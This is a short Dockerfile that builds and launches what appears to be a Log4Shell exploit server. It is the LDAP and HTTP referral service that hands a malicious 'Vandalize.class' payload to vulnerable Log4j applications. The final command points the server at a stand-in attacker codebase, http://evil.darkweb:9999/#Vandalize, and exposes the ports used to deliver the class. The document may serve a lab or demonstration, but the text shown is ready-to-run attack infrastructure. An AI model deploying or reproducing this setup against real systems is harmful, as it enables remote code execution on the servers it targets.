# Use the latest Maven image with JDK 8
FROM maven:3.8.6-openjdk-8-slim as build
COPY pom.xml pom.xml
COPY src src
RUN --mount=target=$HOME/.m2,type=cache mvn clean package

# Use the latest OpenJDK image with Oracle Linux 8
FROM openjdk:18.0.2-jdk-oraclelinux8 as ldap
RUN yum update -y && yum install -y openssl-libs libgcrypt && yum clean all
COPY --from=build target/log4shell-server-*-jar-with-dependencies.jar /server.jar
EXPOSE 8000
EXPOSE 9999

CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#Vandalize", "8000", "9999", "Vandalize.class"]
